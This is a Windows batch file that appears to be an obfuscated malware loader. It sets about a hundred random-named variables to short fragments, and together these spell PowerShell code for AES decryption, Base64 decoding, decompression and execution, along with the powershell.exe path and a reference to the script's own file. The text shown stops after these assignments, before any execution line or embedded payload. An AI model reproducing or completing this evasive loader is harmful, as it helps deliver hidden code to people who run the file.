@echo off
!YUIHJZALwOHQtSKjodAY! "VVraiptOGH=aylo"
!YUIHJZALwOHQtSKjodAY! "OFahtEoAVe=])))"
!YUIHJZALwOHQtSKjodAY! "OlMevRPBAW=aylo"
!YUIHJZALwOHQtSKjodAY! "AHGPyHdsPD=bngC"
!YUIHJZALwOHQtSKjodAY! "iQUSWOiAME=;	$C"
!YUIHJZALwOHQtSKjodAY! "nFYLYXvxnm=ds_v"
!YUIHJZALwOHQtSKjodAY! "gLLuZXIvUR=var."
!YUIHJZALwOHQtSKjodAY! "GVJOsyuyyY=$par"
!YUIHJZALwOHQtSKjodAY! "LgIPRMXHBS=Leng"
!YUIHJZALwOHQtSKjodAY! "otEdRYhWrX=tS46"
!YUIHJZALwOHQtSKjodAY! "COIXEoNTKq=aes_"
!YUIHJZALwOHQtSKjodAY! "PXFwtmdEDu=yste"
!YUIHJZALwOHQtSKjodAY! "uHfZGmTpHt=hVvx"
!YUIHJZALwOHQtSKjodAY! "yuKJYWDSji=ion "
!YUIHJZALwOHQtSKjodAY! "lswodqbeYY=on ("
!YUIHJZALwOHQtSKjodAY! "AuqfRhwmqH=New-"
!YUIHJZALwOHQtSKjodAY! "sqDiLImIIU=em.I"
!YUIHJZALwOHQtSKjodAY! "VjgspAhkdD=unct"
!YUIHJZALwOHQtSKjodAY! "EuGLDZRCjd=func"
!YUIHJZALwOHQtSKjodAY! "mKxfiTbpsf=gnir"
!YUIHJZALwOHQtSKjodAY! "OdzWBMpvGq=tion"
!YUIHJZALwOHQtSKjodAY! "KXjwOSBHnq=S46e"
!YUIHJZALwOHQtSKjodAY! "aNCRpWblYE=ctio"
!YUIHJZALwOHQtSKjodAY! "baRfIEcJAT=in $"
!YUIHJZALwOHQtSKjodAY! "nKkjmWtIAY=tion"
!YUIHJZALwOHQtSKjodAY! "pFqRVjXzBi=7;	$"
!YUIHJZALwOHQtSKjodAY! "xQJFxyzycQ=-joi"
!YUIHJZALwOHQtSKjodAY! "dwFUqkBnYY=nkk."
!YUIHJZALwOHQtSKjodAY! "rSyhSWsdgj=func"
!YUIHJZALwOHQtSKjodAY! "VSoypcShOX=n($p"
!YUIHJZALwOHQtSKjodAY! "qtXvXavTKE=;	$a"
!YUIHJZALwOHQtSKjodAY! "xhyyqkEfku=inal"
!YUIHJZALwOHQtSKjodAY! "wmebXxrGPw=oin "
!YUIHJZALwOHQtSKjodAY! "DAhCoMHdlO=[Sys"
!YUIHJZALwOHQtSKjodAY! "dWwIryhGpN=ion "
!YUIHJZALwOHQtSKjodAY! "roLxvvsnAR=trin"
!YUIHJZALwOHQtSKjodAY! "AxQdizeNUw=lit("
!YUIHJZALwOHQtSKjodAY! "xFjvkvHwoC=$XEl"
!YUIHJZALwOHQtSKjodAY! "JVBjBpvOXA=ar=d"
!YUIHJZALwOHQtSKjodAY! "NaQTCkRTlT=ect "
!YUIHJZALwOHQtSKjodAY! "cbEGHdHOPz=morF"
!YUIHJZALwOHQtSKjodAY! "LmVZfRnsmp=;$pa"
!YUIHJZALwOHQtSKjodAY! "lwaRGkxYmx=s_fu"
!YUIHJZALwOHQtSKjodAY! "pRMhzsxuDT='')("
!YUIHJZALwOHQtSKjodAY! "SOqHdKWbtk=')('"
!YUIHJZALwOHQtSKjodAY! "yWwaWCrhEk=rF'["
!YUIHJZALwOHQtSKjodAY! "uHIJAkeqvq=rn_v"
!YUIHJZALwOHQtSKjodAY! "UeZNXpCvda=dvfO"
!YUIHJZALwOHQtSKjodAY! "YpNmAOEfNd=	if "
!YUIHJZALwOHQtSKjodAY! "iRFAulkoqo=r);}"
!YUIHJZALwOHQtSKjodAY! "yMhHytkfor=]::N"
!YUIHJZALwOHQtSKjodAY! "JdoCExDkTe=tion"
!YUIHJZALwOHQtSKjodAY! "ClqgwoGvKE=..-1"
!YUIHJZALwOHQtSKjodAY! "txYUAEJlqR=g[]]"
!YUIHJZALwOHQtSKjodAY! "ATpQIFnBOe=);	$"
!YUIHJZALwOHQtSKjodAY! "sauwhvvxje=);$p"
!YUIHJZALwOHQtSKjodAY! "GrqPtagSCR= dec"
!YUIHJZALwOHQtSKjodAY! "MPJNFCFUTF=.Cry"
!YUIHJZALwOHQtSKjodAY! "YqClISaIKf=iron"
!YUIHJZALwOHQtSKjodAY! "pBagvYxvyz=k($p"
!YUIHJZALwOHQtSKjodAY! "pMiyOKXcZW=tion"
!YUIHJZALwOHQtSKjodAY! "hNavHMyFsm=-16]"
!YUIHJZALwOHQtSKjodAY! "beBdVKhTFa=)([b"
!YUIHJZALwOHQtSKjodAY! "XxerpfmZxH=ompr"
!YUIHJZALwOHQtSKjodAY! "JRZeldFpZf=ram_"
!YUIHJZALwOHQtSKjodAY! "zsbfufjGKi=togr"
!YUIHJZALwOHQtSKjodAY! "xbnArAqMzv=am_v"
!YUIHJZALwOHQtSKjodAY! "MRzzatoGKM=aram"
!YUIHJZALwOHQtSKjodAY! "xtxkMqQLmn=C;	$"
!YUIHJZALwOHQtSKjodAY! "jKNAmfHdiz=ar;}"
!YUIHJZALwOHQtSKjodAY! "qqSBCqfPho=raph"
!YUIHJZALwOHQtSKjodAY! "ktkqwOdrjI=aes_"
!YUIHJZALwOHQtSKjodAY! "iYiRftYtZW=$hos"
!YUIHJZALwOHQtSKjodAY! "qktWQAMCrE=($pa"
!YUIHJZALwOHQtSKjodAY! "WivXifIAuZ=or_v"
!YUIHJZALwOHQtSKjodAY! "iQIVIDzbeD='%~f0'"
!YUIHJZALwOHQtSKjodAY! "lTWBcnOXwN=6] -"
!YUIHJZALwOHQtSKjodAY! "ZYmolOImma=));"
!YUIHJZALwOHQtSKjodAY! "DNKuRWFeNs=in '"
!YUIHJZALwOHQtSKjodAY! "ZzucnBCiXG=nver"
!YUIHJZALwOHQtSKjodAY! "mqpbnmSnYv=rity"
!YUIHJZALwOHQtSKjodAY! "DuzENqSUVs=(,[s"
!YUIHJZALwOHQtSKjodAY! "VtFtUWsRHs=ctio"
!YUIHJZALwOHQtSKjodAY! "PvkwIcJrui=($me"
!YUIHJZALwOHQtSKjodAY! "PfvQWBzJZJ=.Aes"
!YUIHJZALwOHQtSKjodAY! "ElIcZiZEUC=_fun"
!YUIHJZALwOHQtSKjodAY! "klScvpvUaf=cute"
!YUIHJZALwOHQtSKjodAY! "uydxbKoyLg=e+fq"
!YUIHJZALwOHQtSKjodAY! "sqIWmfEHGU= '')"
!YUIHJZALwOHQtSKjodAY! "XalAovVSHM=decr"
!YUIHJZALwOHQtSKjodAY! "BgrqXOJsIJ=le -"
!YUIHJZALwOHQtSKjodAY! "IGZcumTaKW=ell."
!YUIHJZALwOHQtSKjodAY! "NnEdJZlmLB=ell\"
!YUIHJZALwOHQtSKjodAY! "djwRrojsXs=\pow"
!YUIHJZALwOHQtSKjodAY! "yaDVJSXEze=ndow"
!YUIHJZALwOHQtSKjodAY! "HaJvcTTLDv=sPow"
!YUIHJZALwOHQtSKjodAY! "aqpRAcxuNd=v1.0"
!YUIHJZALwOHQtSKjodAY! "ZOivtYVOVh=tem3"
!YUIHJZALwOHQtSKjodAY! "cgPQXWUZnU=2\Wi"
!YUIHJZALwOHQtSKjodAY! "DjRlYrrTKr=erSh"
